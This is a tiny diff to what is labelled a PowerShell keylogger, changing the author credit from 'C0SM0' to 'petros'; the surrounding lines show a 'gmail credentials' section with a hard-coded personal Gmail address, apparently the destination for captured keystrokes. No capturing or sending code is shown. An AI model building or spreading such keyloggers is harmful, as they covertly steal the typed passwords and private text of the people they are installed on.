@@ -1,5 +1,5 @@
 # powershell keylogger
-# created by : C0SM0
+# created by : petros
 
 # gmail credentials
 $email = "websitepetros@gmail.com"
